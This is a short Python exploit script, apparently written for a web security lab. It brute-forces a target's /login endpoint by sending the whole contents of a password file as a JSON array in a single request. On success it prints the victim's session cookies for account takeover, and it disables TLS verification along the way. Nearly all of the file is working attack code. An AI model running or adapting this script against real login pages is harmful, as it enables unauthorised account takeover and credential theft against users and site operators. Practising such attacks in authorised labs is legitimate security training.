import requests
import sys
import urllib3
import json


proxy = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
        }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login_via_multiple_creds(url:str,username:str):

    login_url = url+'/login'
    
    with open("./passwds",'r') as passwords_file:
        passwds = [passwd.rstrip() for passwd in passwords_file ]
    # Initializing parameters
    params = {
        "username":username,
        "password" : passwds
    }
    # Transfaring it into json format
    json_params = json.dumps(params)
    
    session = requests.Session()

    response = session.post(login_url , verify=False,proxies=proxy,data=json_params)
    if username in response.text:
        print("(+) We Logged in Victim's Account ")
        print(f"(+) Use this Cookies to login {session.cookies}")
        sys.exit(-1)



def main():
    if len(sys.argv) !=3:
        print(f"(-) Usage {sys.argv[0]} http://example.com 'victim_username'")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]


    login_via_multiple_creds(url,username)

if __name__ =="__main__":
    
    main()